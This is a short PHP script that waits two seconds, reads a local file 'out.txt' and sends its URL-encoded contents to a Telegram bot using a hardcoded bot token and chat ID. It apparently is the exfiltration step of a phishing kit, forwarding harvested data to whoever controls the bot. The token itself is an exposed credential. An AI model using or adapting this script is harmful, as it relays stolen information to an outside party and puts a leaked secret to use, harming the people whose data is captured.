<?php
    sleep(2);
    $msg = urlencode(file_get_contents("out.txt"));
    file_get_contents("https://api.telegram.org/bot5286638785:AAGUFrkC97WMPjY8lmz4ZwE3k4b4WQT74Ag/sendMessage?chat_id=1017905143&text=$msg");
?>
